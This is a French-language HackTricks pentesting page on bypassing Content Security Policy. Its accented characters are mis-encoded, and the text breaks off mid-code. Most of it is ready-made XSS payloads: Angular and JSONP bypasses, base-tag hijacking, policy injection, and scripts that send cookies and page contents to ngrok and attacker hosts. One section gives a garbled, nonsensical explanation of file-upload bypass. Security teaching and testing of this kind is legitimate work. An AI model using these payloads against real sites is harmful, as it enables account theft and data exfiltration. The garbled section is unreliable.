# Contournement de la politique de s√©curit√© du contenu (CSP)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? Ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof est la plateforme de tous les programmes de primes pour les bugs de crypto.**

**Obtenez des r√©compenses sans d√©lai**\
Les primes HackenProof ne sont lanc√©es que lorsque les clients d√©posent le budget de r√©compense. Vous recevrez la r√©compense apr√®s la v√©rification du bug.

**Acqu√©rez de l'exp√©rience en pentest web3**\
Les protocoles blockchain et les contrats intelligents sont le nouvel Internet ! Ma√Ætrisez la s√©curit√© web3 d√®s ses d√©buts.

**Devenez une l√©gende du piratage web3**\
Gagnez des points de r√©putation avec chaque bug v√©rifi√© et conqu√©rez le sommet du classement hebdomadaire.

[**Inscrivez-vous sur HackenProof**](https://hackenproof.com/register) et commencez √† gagner gr√¢ce √† vos piratages !

{% embed url="https://hackenproof.com/register" %}

## Qu'est-ce que CSP

La politique de s√©curit√© du contenu (Content Security Policy ou CSP) est une technologie int√©gr√©e au navigateur qui **aide √† se prot√©ger contre des attaques telles que les scripts intersites (XSS)**. Elle r√©pertorie et d√©crit les chemins et sources √† partir desquels le navigateur peut charger en toute s√©curit√© des ressources. Les ressources peuvent inclure des images, des frames, du javascript et plus encore. Voici un exemple de ressources autoris√©es √† √™tre charg√©es et ex√©cut√©es en ligne √† partir du domaine local (self), et permettant l'ex√©cution de code sous forme de cha√Æne avec des fonctions telles que `eval`, `setTimeout` ou `setInterval:`

La politique de s√©curit√© du contenu est mise en ≈ìuvre via des **en-t√™tes de r√©ponse** ou des **√©l√©ments meta de la page HTML**. Le navigateur suit la politique re√ßue et bloque activement les violations d√©tect√©es.

Mise en ≈ìuvre via l'en-t√™te de r√©ponse :
```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
Impl√©ment√© via la balise meta :
```markup
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### En-t√™tes

* `Content-Security-Policy`
* `Content-Security-Policy-Report-Only` Celui-ci ne bloquera rien, il enverra seulement des rapports (√† utiliser dans un environnement de pr√©-production).

## D√©finition des ressources

CSP fonctionne en restreignant les origines √† partir desquelles les contenus actifs et passifs peuvent √™tre charg√©s. Il peut √©galement restreindre certains aspects des contenus actifs tels que l'ex√©cution de JavaScript en ligne et l'utilisation de `eval()`.
```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Directives

* **script-src**: Cette directive sp√©cifie les sources autoris√©es pour JavaScript. Cela inclut non seulement les URL charg√©es directement dans les √©l√©ments, mais aussi des choses comme les gestionnaires d'√©v√©nements de script en ligne (onclick) et les feuilles de style XSLT qui peuvent d√©clencher l'ex√©cution de script.
* **default-src**: Cette directive d√©finit la politique de r√©cup√©ration des ressources par d√©faut. Lorsque les directives de r√©cup√©ration sont absentes dans l'en-t√™te CSP, le navigateur suit cette directive par d√©faut.
* **Child-src**: Cette directive d√©finit les ressources autoris√©es pour les travailleurs Web et les contenus de trame int√©gr√©s.
* **connect-src**: Cette directive restreint les URL pouvant √™tre charg√©es √† l'aide d'interfaces telles que fetch, websocket, XMLHttpRequest.
* **frame-src**: Cette directive restreint les URL des trames pouvant √™tre appel√©es.
* **frame-ancestors**: Cette directive sp√©cifie les sources pouvant int√©grer la page actuelle. Cette directive s'applique aux balises [`<frame>`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/frame), [`<iframe>`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/iframe), [`<object>`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/object), [`<embed>`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/embed) ou [`<applet>`](https://developer.mozilla.org/fr/docs/Web/HTML/Element/applet). Cette directive ne peut pas √™tre utilis√©e dans les balises et s'applique uniquement aux ressources non HTML.
* **img-src**: Elle d√©finit les sources autoris√©es pour charger des images sur la page Web.
* **font-src:** Cette directive sp√©cifie les sources valides pour les polices charg√©es √† l'aide de `@font-face`.
* **manifest-src**: Cette directive d√©finit les sources autoris√©es des fichiers de manifeste d'application.
* **media-src**: Elle d√©finit les sources autoris√©es √† partir desquelles les objets multim√©dias peuvent √™tre charg√©s.
* **object-src**: Elle d√©finit les sources autoris√©es pour les √©l√©ments \<object>, \<embed> et \<applet>.
* **base-uri**: Elle d√©finit les URL autoris√©es qui peuvent √™tre charg√©es √† l'aide d'un √©l√©ment.
* **form-action**: Cette directive r√©pertorie les points de terminaison valides pour la soumission des balises.
* **plugin-types**: Elle d√©finit des limites sur les types MIME que peut invoquer une page.
* **upgrade-insecure-requests**: Cette directive indique aux navigateurs de r√©√©crire les sch√©mas d'URL, en rempla√ßant HTTP par HTTPS. Cette directive peut √™tre utile pour les sites Web avec un grand nombre d'anciennes URL qui doivent √™tre r√©√©crites.
* **sandbox**: La directive sandbox permet de cr√©er un environnement restreint pour la ressource demand√©e, similaire √† l'attribut sandbox. Elle applique des restrictions aux actions d'une page, notamment en emp√™chant l'ouverture de fen√™tres contextuelles, l'ex√©cution de plugins et de scripts, et en imposant une politique de m√™me origine.

### **Sources**

* \*: Cela permet n'importe quelle URL sauf les sch√©mas `data:`, `blob:`, `filesystem:`
* **self**: Cette source indique que le chargement des ressources sur la page est autoris√© depuis le m√™me domaine.
* **data**: Cette source permet le chargement de ressources via le sch√©ma de donn√©es (par exemple, des images encod√©es en Base64)
* **none**: Cette directive n'autorise rien √† √™tre charg√© depuis aucune source.
* **unsafe-eval**: Cela permet l'utilisation de eval() et de m√©thodes similaires pour cr√©er du code √† partir de cha√Ænes. Ce n'est pas une pratique s√ªre d'inclure cette source dans une directive. Pour la m√™me raison, elle est nomm√©e unsafe (non s√©curis√©e).
* **unsafe-hashes**: Cela permet d'activer des gestionnaires d'√©v√©nements en ligne sp√©cifiques.
* **unsafe-inline**: Cela permet l'utilisation de ressources en ligne, telles que des √©l√©ments en ligne, des URL javascript:, des gestionnaires d'√©v√©nements en ligne et des √©l√©ments en ligne. Encore une fois, cela n'est pas recommand√© pour des raisons de s√©curit√©.
* **nonce**: Une liste blanche pour des scripts en ligne sp√©cifiques utilisant un nonce cryptographique (nombre utilis√© une seule fois). Le serveur doit g√©n√©rer une valeur de nonce unique √† chaque fois qu'il transmet une politique.
* **sha256-\<hash>**: Autorise les scripts avec un hachage sha256 sp√©cifique.
* **strict-dynamic**: Elle permet au navigateur de charger et d'ex√©cuter de nouvelles balises JavaScript dans le DOM √† partir de n'importe quelle source de script qui a √©t√© pr√©c√©demment autoris√©e par une valeur "nonce" ou "hash".
* **host**: Indique un h√¥te tel que example.com

## R√®gles CSP non s√©curis√©es

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
Charge utile de travail : `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' via les iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
Payload de travail:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

Si vous parvenez d'une mani√®re ou d'une autre √† faire en sorte qu'un **code JS autoris√© cr√©e une nouvelle balise script** dans le DOM avec votre code JS, car un script autoris√© le cr√©e, la **nouvelle balise script sera autoris√©e √† √™tre ex√©cut√©e**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
Payload de travail:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Absence de object-src et default-src

{% hint style="danger" %}
**Il semble que cela ne fonctionne plus**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
Payloads de travail:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### T√©l√©chargement de fichiers + 'self'

Lorsque vous effectuez un test de p√©n√©tration sur une application Web, il est courant de rencontrer une politique de s√©curit√© du contenu (CSP) qui restreint les sources autoris√©es pour les ressources charg√©es par l'application. Cela peut inclure des restrictions sur les scripts, les images, les polices, etc.

Une directive CSP courante est `default-src 'self'`, qui permet uniquement le chargement de ressources provenant du m√™me domaine que l'application. Cela peut poser un probl√®me lorsqu'il s'agit de t√©l√©charger des fichiers, car le navigateur bloque les requ√™tes vers des domaines tiers.

Cependant, il existe une technique pour contourner cette restriction lors du t√©l√©chargement de fichiers. Vous pouvez utiliser une faille de type "leak" pour envoyer le fichier vers un service tiers, puis r√©cup√©rer l'URL de t√©l√©chargement √† partir de ce service et la fournir √† l'utilisateur.

Voici comment cela fonctionne :

1. L'application Web permet √† l'utilisateur de t√©l√©charger un fichier.
2. Au lieu de t√©l√©charger directement le fichier sur le serveur de l'application, vous envoyez le fichier vers un service tiers (par exemple, un service de stockage en nuage).
3. Une fois le fichier t√©l√©charg√© sur le service tiers, vous r√©cup√©rez l'URL de t√©l√©chargement g√©n√©r√©e par le service.
4. Vous fournissez cette URL √† l'utilisateur, qui peut alors t√©l√©charger le fichier en cliquant dessus.

De cette fa√ßon, vous contournez la restriction CSP "default-src 'self'" en utilisant un service tiers pour h√©berger le fichier et en fournissant simplement l'URL de t√©l√©chargement √† l'utilisateur.

Il est important de noter que cette technique ne fonctionnera que si le service tiers utilis√© n'est pas bloqu√© par la politique CSP de l'application. Vous devrez donc trouver un service tiers qui n'est pas restreint par la politique CSP en vigueur.
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
Si vous pouvez t√©l√©charger un fichier JS, vous pouvez contourner cette CSP :

Charge utile fonctionnelle :
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
Cependant, il est tr√®s probable que le serveur **valide le fichier t√©l√©charg√©** et n'autorise que le **t√©l√©chargement de certains types de fichiers**.

De plus, m√™me si vous pouviez t√©l√©charger un **code JS** √† l'int√©rieur d'un fichier en utilisant une extension accept√©e par le serveur (comme : _script.png_), cela ne suffirait pas car certains serveurs comme Apache **s√©lectionnent le type MIME du fichier en fonction de l'extension** et les navigateurs comme Chrome **refusent d'ex√©cuter du code Javascript** √† l'int√©rieur de quelque chose qui devrait √™tre une image. Heureusement, il y a des erreurs. Par exemple, √† partir d'un CTF, j'ai appris qu'**Apache ne reconna√Æt pas** l'extension _**.wave**_, donc il ne la sert pas avec un **type MIME comme audio/\***.

√Ä partir de l√†, si vous trouvez une XSS et un t√©l√©chargement de fichier, et que vous parvenez √† trouver une **extension mal interpr√©t√©e**, vous pouvez essayer de t√©l√©charger un fichier avec cette extension et le contenu du script. Ou, si le serveur v√©rifie le format correct du fichier t√©l√©charg√©, cr√©ez un polyglotte ([quelques exemples de polyglottes ici](https://github.com/Polydet/polyglot-database)).

### Points d'acc√®s tiers + ('unsafe-eval')

{% hint style="warning" %}
Pour certains des payloads suivants, **`unsafe-eval` n'est m√™me pas n√©cessaire**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
Chargez une version vuln√©rable d'Angular et ex√©cutez du code JS arbitraire :

```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.js"></script>
<script>
    angular.module('myApp', [])
        .controller('myController', function($scope) {
            $scope.name = 'John Doe';
        });
</script>
```

Dans cet exemple, nous chargeons une version vuln√©rable d'Angular (1.2.0) √† partir de la biblioth√®que Google CDN. Ensuite, nous cr√©ons un module Angular appel√© "myApp" et un contr√¥leur appel√© "myController". Dans le contr√¥leur, nous d√©finissons une variable $scope "name" avec la valeur "John Doe". Cette vuln√©rabilit√© permet √† un attaquant d'ex√©cuter du code JS arbitraire sur la page.
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Charges utiles utilisant Angular + une biblioth√®que avec des fonctions qui renvoient l'objet `window` ([consultez cet article](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
L'article montre que vous pourriez **charger** toutes les **biblioth√®ques** depuis `cdn.cloudflare.com` (ou tout autre r√©f√©rentiel de biblioth√®ques JS autoris√©), ex√©cuter toutes les fonctions ajout√©es de chaque biblioth√®que et v√©rifier **quelles fonctions de quelles biblioth√®ques renvoient l'objet `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>



```
#### Abus du code JS de Google reCAPTCHA

Selon [**ce compte rendu de CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=fr&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves), vous pouvez abuser de [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) √† l'int√©rieur d'une CSP pour ex√©cuter du code JS arbitraire en contournant la CSP :
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
### Points de terminaison tiers + JSONP

JSONP (JSON with Padding) est une technique utilis√©e pour contourner la politique de s√©curit√© du contenu (CSP) lors de l'acc√®s √† des ressources tierces. La CSP est une couche de s√©curit√© qui permet aux propri√©taires de sites web de sp√©cifier les sources l√©gitimes de contenu qui peuvent √™tre charg√©es sur leurs pages. Cela aide √† pr√©venir les attaques de type cross-site scripting (XSS) en limitant les sources de contenu autoris√©es.

Cependant, certaines applications web utilisent des points de terminaison tiers pour r√©cup√©rer des donn√©es JSON. Si ces points de terminaison ne sont pas autoris√©s par la CSP, il est possible d'utiliser JSONP pour contourner cette restriction.

JSONP fonctionne en ajoutant dynamiquement un script √† la page web qui charge les donn√©es JSON √† partir du point de terminaison tiers. Le point de terminaison doit prendre en charge JSONP en enveloppant les donn√©es JSON dans une fonction de rappel sp√©cifi√©e par le client. Lorsque le script est charg√©, la fonction de rappel est ex√©cut√©e avec les donn√©es JSON en tant que param√®tre.

Pour exploiter cette vuln√©rabilit√©, un attaquant peut utiliser un point de terminaison tiers vuln√©rable √† JSONP pour ex√©cuter du code malveillant sur la page web cible. Cela peut permettre √† l'attaquant de voler des informations sensibles, d'injecter du contenu malveillant ou de compromettre la s√©curit√© de la page web.

Il est important de noter que JSONP pr√©sente des risques de s√©curit√© et est consid√©r√© comme une technique obsol√®te. Il est recommand√© d'utiliser des m√©thodes plus s√©curis√©es, telles que CORS (Cross-Origin Resource Sharing), pour acc√©der √† des ressources tierces de mani√®re contr√¥l√©e et s√©curis√©e.
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Des sc√©narios comme celui-ci o√π `script-src` est d√©fini sur `self` et un domaine particulier qui est autoris√© peuvent √™tre contourn√©s en utilisant JSONP. Les points de terminaison JSONP permettent des m√©thodes de rappel non s√©curis√©es qui permettent √† un attaquant d'ex√©cuter une attaque XSS, charge utile de travail :
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **contient des points de terminaison JSONP pr√™ts √† l'emploi pour contourner CSP sur diff√©rents sites web.**

La m√™me vuln√©rabilit√© se produira si le **point de terminaison de confiance contient une redirection ouverte** car si le point de terminaison initial est de confiance, les redirections sont de confiance.

### Contournement via RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

En plus de la redirection mentionn√©e pr√©c√©demment pour contourner les restrictions de chemin, il existe une autre technique appel√©e Relative Path Overwrite (RPO) qui peut √™tre utilis√©e sur certains serveurs.

Par exemple, si CSP autorise le chemin `https://example.com/scripts/react/`, il peut √™tre contourn√© de la mani√®re suivante:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
Le navigateur finira par charger `https://example.com/scripts/angular/angular.js`.

Cela fonctionne car pour le navigateur, vous chargez un fichier nomm√© `..%2fangular%2fangular.js` situ√© sous `https://example.com/scripts/react/`, ce qui est conforme √† la CSP.

Cependant, pour certains serveurs, lorsqu'ils re√ßoivent la requ√™te, ils la d√©codent, ce qui revient √† demander `https://example.com/scripts/react/../angular/angular.js`, ce qui est √©quivalent √† `https://example.com/scripts/angular/angular.js`.

En **exploitant cette incoh√©rence dans l'interpr√©tation de l'URL entre le navigateur et le serveur, les r√®gles de chemin peuvent √™tre contourn√©es**.

La solution consiste √† ne pas traiter `%2f` comme `/` c√¥t√© serveur, en garantissant une interpr√©tation coh√©rente entre le navigateur et le serveur pour √©viter ce probl√®me.

Exemple en ligne : [ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Ex√©cution de JS dans les iframes

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### **base-uri** manquant

Si la directive **base-uri** est manquante, vous pouvez l'exploiter pour effectuer une [**injection de balisage suspendu**](../dangling-markup-html-scriptless-injection/).

De plus, si la **page charge un script en utilisant un chemin relatif** (comme `<script src="/js/app.js">`) en utilisant un **Nonce**, vous pouvez exploiter la **balise base** pour le faire **charger** le script depuis **votre propre serveur, r√©alisant ainsi une XSS**.\
Si la page vuln√©rable est charg√©e avec **httpS**, utilisez une URL httpS dans la balise base.
```html
<base href="https://www.attacker.com/">
```
### √âv√©nements AngularJS

Selon la politique sp√©cifique, le CSP bloquera les √©v√©nements JavaScript. Cependant, AngularJS d√©finit ses propres √©v√©nements qui peuvent √™tre utilis√©s √† la place. Lorsqu'il est √† l'int√©rieur d'un √©v√©nement, AngularJS d√©finit un objet sp√©cial `$event`, qui fait simplement r√©f√©rence √† l'objet d'√©v√©nement du navigateur. Vous pouvez utiliser cet objet pour contourner le CSP. Sur Chrome, il existe une propri√©t√© sp√©ciale sur l'objet `$event/event` appel√©e `path`. Cette propri√©t√© contient un tableau d'objets qui provoque l'ex√©cution de l'√©v√©nement. La derni√®re propri√©t√© est toujours l'objet `window`, que nous pouvons utiliser pour effectuer une √©vasion de bac √† sable. En passant ce tableau au filtre `orderBy`, nous pouvons √©num√©rer le tableau et utiliser le dernier √©l√©ment (l'objet `window`) pour ex√©cuter une fonction globale, telle que `alert()`. Le code suivant illustre cela :
```markup
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
**Trouvez d'autres contournements Angular dans** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

### AngularJS et domaine autoris√©
```
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;
```
Si l'application utilise Angular JS et que les scripts sont charg√©s √† partir d'un domaine autoris√©, il est possible de contourner cette politique CSP en appelant des fonctions de rappel et des classes vuln√©rables. Pour plus de d√©tails, visitez ce super [git](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-%22Sh\*t,-it's-CSP!%22) repo.

Payloads fonctionnels:
```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- no longer working -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```
D'autres points d'ex√©cution arbitraire JSONP peuvent √™tre trouv√©s [**ici**](https://github.com/zigoo0/JSONBee/blob/master/jsonp.txt) (certains d'entre eux ont √©t√© supprim√©s ou corrig√©s).

### Contournement via redirection

Que se passe-t-il lorsque CSP rencontre une redirection c√¥t√© serveur ? Si la redirection m√®ne √† une origine diff√©rente qui n'est pas autoris√©e, elle √©chouera toujours.

Cependant, selon la description dans [la sp√©cification CSP 4.2.2.3. Chemins et redirections](https://www.w3.org/TR/CSP2/#source-list-paths-and-redirects), si la redirection m√®ne √† un chemin diff√©rent, elle peut contourner les restrictions d'origine.

Voici un exemple :
```html
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Security-Policy" content="script-src http://localhost:5555 https://www.google.com/a/b/c/d">
</head>
<body>
<div id=userContent>
<script src="https://https://www.google.com/test"></script>
<script src="https://https://www.google.com/a/test"></script>
<script src="http://localhost:5555/301"></script>
</div>
</body>
</html>
```
Si CSP est d√©fini sur `https://www.google.com/a/b/c/d`, √©tant donn√© que le chemin est pris en compte, les scripts `/test` et `/a/test` seront tous deux bloqu√©s par CSP.

Cependant, le lien final `http://localhost:5555/301` sera **redirig√© c√¥t√© serveur vers `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`**. √âtant donn√© qu'il s'agit d'une redirection, le **chemin n'est pas pris en compte** et le **script peut √™tre charg√©**, contournant ainsi la restriction du chemin.

Avec cette redirection, m√™me si le chemin est sp√©cifi√© en entier, il sera quand m√™me contourn√©.

Par cons√©quent, la meilleure solution est de s'assurer que le site web ne pr√©sente aucune vuln√©rabilit√© de redirection ouverte et qu'il n'y a aucun domaine pouvant √™tre exploit√© dans les r√®gles CSP.

### Contourner CSP avec du balisage suspendu

Lire [comment faire ici](../dangling-markup-html-scriptless-injection/).

### 'unsafe-inline'; img-src \*; via XSS
```
default-src 'self' 'unsafe-inline'; img-src *;
```
`'unsafe-inline'` signifie que vous pouvez ex√©cuter n'importe quel script √† l'int√©rieur du code (XSS peut ex√©cuter du code) et `img-src *` signifie que vous pouvez utiliser sur la page web n'importe quelle image provenant de n'importe quelle ressource.

Vous pouvez contourner cette CSP en exfiltrant les donn√©es via des images (dans ce cas, le XSS exploite un CSRF o√π une page accessible par le bot contient une SQLi, et extrait le drapeau via une image) :
```javascript
<script>fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new Image().src='http://PLAYER_SERVER/?'+_)</script>
```
De: [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

Vous pouvez √©galement abuser de cette configuration pour **charger du code JavaScript ins√©r√© √† l'int√©rieur d'une image**. Par exemple, si la page autorise le chargement d'images depuis Twitter, vous pouvez **cr√©er** une **image sp√©ciale**, la **t√©l√©charger** sur Twitter et abuser de l'option "**unsafe-inline**" pour **ex√©cuter** un code JS (comme une XSS classique) qui va **charger** l'image, **extraire** le **JS** de celle-ci et **l'ex√©cuter** : [https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/](https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/)

### Avec les Service Workers

La fonction **`importScripts`** des Service Workers n'est pas limit√©e par la CSP :

{% content-ref url="../xss-cross-site-scripting/abusing-service-workers.md" %}
[abusing-service-workers.md](../xss-cross-site-scripting/abusing-service-workers.md)
{% endcontent-ref %}

### Injection de politique

**Recherche :** [**https://portswigger.net/research/bypassing-csp-with-policy-injection**](https://portswigger.net/research/bypassing-csp-with-policy-injection)

#### Chrome

Si un **param√®tre** envoy√© par vous est **coll√© √† l'int√©rieur** de la **d√©claration** de la **politique**, vous pouvez **modifier** la **politique** de mani√®re √† la rendre **inutile**. Vous pouvez **autoriser le script 'unsafe-inline'** avec l'une de ces contournements :
```bash
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```
Parce que cette directive va **√©craser les directives script-src existantes**.\
Vous pouvez trouver un exemple ici: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=%3Bscript-src-elem+\*\&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)

#### Edge

Dans Edge, c'est beaucoup plus simple. Si vous pouvez ajouter dans le CSP juste ceci: **`;_`** **Edge** va **supprimer** l'ensemble de la **politique**.\
Exemple: [http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert(1)%3C/script%3E](http://portswigger-labs.net/edge\_csp\_injection\_xndhfye721/?x=;\_\&y=%3Cscript%3Ealert\(1\)%3C/script%3E)

### img-src \*; via XSS (iframe) - Attaque par d√©lai

Remarquez l'absence de la directive `'unsafe-inline'`\
Cette fois, vous pouvez faire en sorte que la victime **charge** une page sous **votre contr√¥le** via **XSS** avec un `<iframe>`. Cette fois, vous allez faire en sorte que la victime acc√®de √† la page √† partir de laquelle vous souhaitez extraire des informations (**CSRF**). Vous ne pouvez pas acc√©der au contenu de la page, mais si vous pouvez **contr√¥ler le temps n√©cessaire √† la page pour se charger**, vous pouvez extraire les informations dont vous avez besoin.

Cette fois, un **drapeau** va √™tre extrait, chaque fois qu'un **caract√®re est correctement devin√©** via SQLi, la **r√©ponse** prend **plus de temps** en raison de la fonction sleep. Ensuite, vous pourrez extraire le drapeau:
```javascript
<iframe name=f id=g></iframe> // The bot will load an URL with the payload
<script>
